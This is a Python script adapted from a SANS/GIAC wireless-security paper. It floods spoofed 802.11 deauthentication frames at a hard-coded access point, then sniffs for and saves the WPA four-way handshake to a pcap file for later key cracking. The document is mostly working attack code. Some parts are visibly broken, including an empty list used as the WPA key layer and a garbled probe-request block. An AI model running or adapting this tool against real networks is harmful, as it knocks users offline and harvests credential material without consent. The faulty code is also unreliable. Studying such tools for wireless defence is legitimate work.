#!/usr/bin/env python
# Original code from https://digi.ninja/gawn_gold/4whsg.py
########################################
#
# This code is part of the SANS/GIAC Gold Paper titled
#
# Programming Wireless Security
#
# by Robin Wood (dninja@gmail.com), accepted May 2008
#
# For more information you can find the paper in the "Wireless Access" section of the
# SANS Reading Room at http://www.sans.org/reading_room/ or at www.digininja.org
#
########################################

import sys
#from scapy import *
#import pylorcon
from scapy.all import *
import PyLorcon2

interface = "mon1"
channel = 11
#interface = sys.argv[1]    
eapol_packets = []
handshake_found = 0
WPA_key = [] # This is wrong... possible change from Lorcon1 to Lorcon2

#injector = pylorcon.Lorcon("ath0", "madwifing")
#injector.setfunctionalmode("INJECT")
#injector.setmode("MONITOR")
#injector.setchannel(11)

# Borrowed Lorcon2 Code from - https://github.com/OpenSecurityResearch/lorcon_examples/blob/master/beacon_flood_raw.py
# Automatically determine the driver of the interface

try:
	driver, description = PyLorcon2.auto_driver(interface)
	if driver is not None:
		print "[+]\t Driver:",driver
except:
	print "[!] Could not determine the driver for",interface
	sys.exit(-1)

# Create LORCON context
try:
	ctx = PyLorcon2.Context(interface)
except:
	print "[!]\t Failed to create context"
	sys.exit(-1)

# Create Monitor Mode Interface

try:
	ctx.open_injmon()
	vap = ctx.get_vap()
	if vap is not None:	
		print "[+]\t Monitor Mode VAP:",vap
except:
	print "[!]\t Could not create Monitor Mode interface!"
	sys.exit(-1)

# Set the channel we'll be injecting on

#try:
#	ctx.set_channel(channel)
#	print "[+]\t Using channel:",channel,"\n"
#except:
#	print "[!]\t Could not set channel!"
#	sys.exit(-1)	


destination_addr = '\xff\xff\xff\xff\xff\xff' # i.e. broadcast
#bss_id_addr = '\x00\x0e\xa6\xce\xe2\x28'
#bss_id_addr = '\x78\x24\xAF\x7D\x75\x68'
bss_id_addr = '\x8A\xDC\x96\x33\xF8\xD8'
source_addr = bss_id_addr # The AP is sending the deauth

packet = "\xc0\x00\x3a\x01"
packet = packet + destination_addr
packet = packet + source_addr
packet = packet + bss_id_addr
packet = packet + "\x80\xcb\x07\x00";

def deauth(packet_count):
	for n in range(packet_count):
		#injector.txpacket (packet)
		ctx.send_bytes (packet)


#mac = ":".join([i.zfill(2) for i in mac.split(":")]).lower()

def expand(x):
    yield x
    while x.payload:
        x = x.payload
        yield x

def sniffEAPOL(p):
###########################################################
#	print list(expand(p))
	if p.haslayer(Dot11):
		print p[Dot11].addr3 # BSSID
	if p.haslayer(Dot11ProbeReq):
		packet = p[Dot11Elt]
	    	cap = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
		crypto = set()
		while isinstance(p, Dot11Elt):
        		if p.ID == 0:
        		    ssid = p.info
        		elif p.ID == 3:
        		    channel = ord(p.info)
        		elif p.ID == 48:
        		    crypto.add("WPA2")
        		elif p.ID == 221 and p.info.startswith('\x00P\xf2\x01\x01\x00'):
        		    crypto.add("WPA")
        		p = p.payload
###########################################################
	if p.haslayer(WPA_key):
		layer = p.getlayer (WPA_key)

		# First, check that the access point is the one we want to target
		AP = p.addr3
		if (not AP == bss_id_addr):
			print AP
			print "not ours\n"
			return

		if (p.FCfield & 1): 
			# Message come from STA 
			# From DS = 0, To DS = 1
			STA = p.addr2
		elif (p.FCfield & 2): 
			# Message come from AP
			# From DS = 1, To DS = 0
			STA = p.addr1
		else:
			# either ad-hoc or WDS
			return
	
		if (not tracking.has_key (STA)):
			fields = {
						'frame2': None,
						'frame3': None,
						'frame4': None,
						'replay_counter': None,
						'packets': []
					}
			tracking[STA] = fields

		key_info = layer.key_info
		wpa_key_length = layer.wpa_key_length
		replay_counter = layer.replay_counter

		WPA_KEY_INFO_INSTALL = 64
		WPA_KEY_INFO_ACK = 128
		WPA_KEY_INFO_MIC = 256

		# check for frame 2
		if ((key_info & WPA_KEY_INFO_MIC) and 
			(key_info & WPA_KEY_INFO_ACK == 0) and 
			(key_info & WPA_KEY_INFO_INSTALL == 0) and 
			(wpa_key_length > 0)) :
			print "Found packet 2 for ", STA
			tracking[STA]['frame2'] = 1
			tracking[STA]['packets'].append (p)

		# check for frame 3
		elif ((key_info & WPA_KEY_INFO_MIC) and 
			(key_info & WPA_KEY_INFO_ACK) and 
			(key_info & WPA_KEY_INFO_INSTALL)):
			print "Found packet 3 for ", STA
			tracking[STA]['frame3'] = 1
			# store the replay counter for this STA
			tracking[STA]['replay_counter'] = replay_counter
			tracking[STA]['packets'].append (p)

		# check for frame 4
		elif ((key_info & WPA_KEY_INFO_MIC) and 
			(key_info & WPA_KEY_INFO_ACK == 0) and 
			(key_info & WPA_KEY_INFO_INSTALL == 0) and
			tracking[STA]['replay_counter'] == replay_counter):
			print "Found packet 4 for ", STA
			tracking[STA]['frame4'] = 1
			tracking[STA]['packets'].append (p)

		
		if (tracking[STA]['frame2'] and tracking[STA]['frame3'] and tracking[STA]['frame4']):
			print "Handshake Found\n\n"
			wrpcap ("/var/gold/a.pcap", tracking[STA]['packets'])
			handshake_found = 1
			sys.exit(0)

tracking = {}

for i in range(1, 10):
	print "About to deauth\n\n"
	deauth(50)
	print "Deauth done, sniffing for EAPOL traffic"

	# reset the tracking between each sniffing attempt
	tracking = {}

	sniff(iface=interface,prn=sniffEAPOL, count=1000, timeout=30)
	
print "No handshake found\n\n"
